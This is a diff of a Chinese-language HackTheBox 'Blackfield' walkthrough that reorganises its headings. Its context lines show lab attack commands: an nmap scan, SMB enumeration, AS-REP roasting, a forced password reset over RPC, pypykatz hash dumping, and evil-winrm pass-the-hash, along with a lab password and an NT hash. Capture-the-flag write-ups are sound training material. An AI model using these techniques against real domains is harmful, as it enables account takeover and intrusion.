@@ -4,11 +4,14 @@ pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 
 ## 全端口扫描
 ~~~
-┌──(lizi㉿lizi)-[~/htb/blackfield]                                                       └─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.192 -oA nmap/ports                       [sudo] password for lizi:
+┌──(lizi㉿lizi)-[~/htb/blackfield]                                                       
+└─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.192 -oA nmap/ports 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 11:44 CST
 Nmap scan report for 10.10.10.192
 Host is up (0.11s latency).
@@ -98,7 +101,7 @@ Nmap done: 1 IP address (1 host up) scanned in 80.37 seconds
 
 ~~~
 
-# 445(smb)
+### SMB 信息收集
 
 发现非默认共享forensic，访问被拒绝
 
@@ -455,6 +458,10 @@ smb: \> dir
 └─$ cat profiles |  grep 'D' | awk -F ' ' '{print $1}' > users.txt
 ~~~
 
+## 漏洞利用
+
+### AS-REP Roasting 获取初始凭据
+
 使用kerbrute爆破用户名，发现可以抓取到用户support的hash
 
 ~~~
@@ -583,7 +590,7 @@ bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local  -ns 10.10
 
 发现support用户可以更改audit2020用户的密码
 
-![](Pasted%20image%2020250118131826.png)
+![](Pasted_image_20250118131826.png)
 
 尝试使用RPC更改密码
 
@@ -649,13 +656,17 @@ smb: \memory_analysis\> dir
 
 解压出来使用pypykatz进行转储哈希
 
-![](Pasted%20image%2020250118160207.png)
+![](Pasted_image_20250118160207.png)
 
 利用hash进行登录
 
 ~~~
 evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.local
 ~~~
+
+## 权限提升
+
+### Backup Operators 组提权
 
 在bloodhound中发现svc_backup用户属于backup operator组，可以备份转储文件
 
